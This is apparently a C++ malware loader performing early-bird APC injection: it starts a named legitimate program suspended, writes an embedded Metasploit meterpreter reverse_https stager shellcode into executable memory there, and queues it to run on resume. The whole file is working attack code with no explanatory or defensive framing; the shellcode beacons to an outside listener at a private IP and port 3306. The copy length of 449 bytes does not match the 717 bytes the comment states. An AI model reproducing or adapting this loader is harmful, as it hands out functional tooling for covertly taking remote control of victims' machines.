#include "pch.h"


INT main(INT argc, LPSTR argv[]) {
	if (argc < 2) {
		std::cerr << "Usage: " << argv[0] << " <LEGIT PE-IMAGE>\n";
		return 0x1;
	}

	/*
	 * windows/x64/meterpreter/reverse_https - 717 bytes (stage 1)
	 * https://metasploit.com/
	 * VERBOSE=false, SSLVersion=TLS1.2, LHOST=192.168.1.7,
	 * LPORT=3306, ReverseAllowProxy=false, PingbackRetries=0,
	 * PingbackSleep=30, LURI=, OverrideRequestHost=false,
	 * HttpUserAgent=Mozilla/5.0 (iPad; CPU OS 15_3_1 like Mac OS
	 * X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2
	 * Mobile/15E148 Safari/604.1, HttpServerName=Apache,
	 * HttpUnknownRequestResponse=<html><body><h1>It
	 * works!</h1></body></html>, IgnoreUnknownPayloads=false,
	 * StagerVerifySSLCert=false, PayloadUUIDTracking=false,
	 * EnableStageEncoding=false, StageEncoderSaveRegisters=,
	 * StageEncodingFallback=true, PrependMigrate=false,
	 * EXITFUNC=thread, StagerRetryCount=10, StagerRetryWait=5,
	 * HttpProxyType=HTTP, AutoLoadStdapi=true,
	 * AutoVerifySessionTimeout=30, InitialAutoRunScript=,
	 * AutoRunScript=, AutoSystemInfo=true,
	 * EnableUnicodeEncoding=false, SessionRetryTotal=3600,
	 * SessionRetryWait=10, SessionExpirationTimeout=604800,
	 * SessionCommunicationTimeout=300, PayloadProcessCommandLine=,
	 * AutoUnhookProcess=false
	 */
	BYTE buf[] =
		"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50\x52"
		"\x48\x31\xd2\x65\x48\x8b\x52\x60\x51\x48\x8b\x52\x18\x56\x48"
		"\x8b\x52\x20\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x8b\x72\x50"
		"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
		"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
		"\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b"
		"\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x8b\x48"
		"\x18\x44\x8b\x40\x20\x50\x49\x01\xd0\xe3\x56\x48\xff\xc9\x4d"
		"\x31\xc9\x41\x8b\x34\x88\x48\x01\xd6\x48\x31\xc0\x41\xc1\xc9"
		"\x0d\xac\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45"
		"\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b"
		"\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x41\x58"
		"\x48\x01\xd0\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48"
		"\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9"
		"\x4b\xff\xff\xff\x5d\x48\x31\xdb\x53\x49\xbe\x77\x69\x6e\x69"
		"\x6e\x65\x74\x00\x41\x56\x48\x89\xe1\x49\xc7\xc2\x4c\x77\x26"
		"\x07\xff\xd5\x53\x53\x48\x89\xe1\x53\x5a\x4d\x31\xc0\x4d\x31"
		"\xc9\x53\x53\x49\xba\x3a\x56\x79\xa7\x00\x00\x00\x00\xff\xd5"
		"\xe8\x0c\x00\x00\x00\x31\x39\x32\x2e\x31\x36\x38\x2e\x31\x2e"
		"\x37\x00\x5a\x48\x89\xc1\x49\xc7\xc0\xea\x0c\x00\x00\x4d\x31"
		"\xc9\x53\x53\x6a\x03\x53\x49\xba\x57\x89\x9f\xc6\x00\x00\x00"
		"\x00\xff\xd5\xe8\xa5\x00\x00\x00\x2f\x43\x4c\x6f\x55\x55\x63"
		"\x34\x79\x58\x30\x6c\x69\x32\x47\x50\x61\x41\x49\x36\x57\x63"
		"\x77\x5f\x6a\x45\x55\x6a\x61\x4e\x72\x37\x7a\x72\x6b\x46\x33"
		"\x35\x41\x32\x7a\x79\x35\x4d\x5f\x6a\x41\x6b\x51\x6c\x70\x45"
		"\x38\x34\x38\x49\x47\x62\x6e\x33\x6a\x4f\x6c\x55\x6b\x6e\x6f"
		"\x6c\x77\x6c\x50\x77\x4e\x54\x47\x53\x4a\x66\x39\x30\x33\x62"
		"\x62\x42\x49\x53\x6b\x4c\x4c\x57\x6e\x52\x43\x38\x77\x4a\x6d"
		"\x56\x44\x78\x64\x71\x57\x77\x54\x65\x6a\x35\x74\x2d\x64\x78"
		"\x64\x42\x4d\x5f\x63\x44\x55\x59\x30\x4e\x5a\x74\x35\x2d\x4b"
		"\x54\x6b\x56\x37\x37\x78\x79\x61\x63\x36\x44\x78\x71\x42\x6a"
		"\x62\x54\x4f\x76\x56\x34\x76\x69\x50\x5f\x4c\x63\x57\x66\x34"
		"\x51\x6d\x30\x79\x74\x6d\x4b\x00\x48\x89\xc1\x53\x5a\x41\x58"
		"\x4d\x31\xc9\x53\x48\xb8\x00\x32\xa8\x84\x00\x00\x00\x00\x50"
		"\x53\x53\x49\xc7\xc2\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x6a"
		"\x0a\x5f\x48\x89\xf1\x6a\x1f\x5a\x52\x68\x80\x33\x00\x00\x49"
		"\x89\xe0\x6a\x04\x41\x59\x49\xba\x75\x46\x9e\x86\x00\x00\x00"
		"\x00\xff\xd5\x4d\x31\xc0\x53\x5a\x48\x89\xf1\x4d\x31\xc9\x4d"
		"\x31\xc9\x53\x53\x49\xc7\xc2\x2d\x06\x18\x7b\xff\xd5\x85\xc0"
		"\x75\x1f\x48\xc7\xc1\x88\x13\x00\x00\x49\xba\x44\xf0\x35\xe0"
		"\x00\x00\x00\x00\xff\xd5\x48\xff\xcf\x74\x02\xeb\xaa\xe8\x55"
		"\x00\x00\x00\x53\x59\x6a\x40\x5a\x49\x89\xd1\xc1\xe2\x10\x49"
		"\xc7\xc0\x00\x10\x00\x00\x49\xba\x58\xa4\x53\xe5\x00\x00\x00"
		"\x00\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89"
		"\xda\x49\xc7\xc0\x00\x20\x00\x00\x49\x89\xf9\x49\xba\x12\x96"
		"\x89\xe2\x00\x00\x00\x00\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74"
		"\xb2\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd2\x58\xc3\x58\x6a"
		"\x00\x59\xbb\xe0\x1d\x2a\x0a\x41\x89\xda\xff\xd5";


	LPSTARTUPINFOA lpSi = (LPSTARTUPINFOA)VirtualAlloc(nullptr, 1 << 12, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	LPPROCESS_INFORMATION lpPi = (LPPROCESS_INFORMATION)VirtualAlloc(nullptr, 1 << 12, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (lpSi == nullptr || lpPi == nullptr) {
		PrintError("VirtualAlloc()", TRUE);
		return 0x1;
	}
	lpSi->cb = sizeof(STARTUPINFOA);

	// start a process in suspended mode, this will be in alertable (done by kernel)
	if (!CreateProcessA(nullptr, argv[1], nullptr, nullptr, FALSE, CREATE_SUSPENDED, nullptr, nullptr, lpSi, lpPi)) {
		PrintError("CreateProcessA()", TRUE);
	}

	LPVOID lpBuff = VirtualAllocEx(lpPi->hProcess , nullptr, 1 << 12, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (lpBuff == nullptr) {
		PrintError("VirtualAllocEx()", TRUE);
		return 0x1;
	}

	WriteProcessMemory(lpPi->hProcess, lpBuff, (LPCVOID)buf, 449, nullptr);
	QueueUserAPC((PAPCFUNC)lpBuff, lpPi->hThread, NULL);
	
	// continue the main thread execution
	ResumeThread(lpPi->hThread);

	return 0x0;
}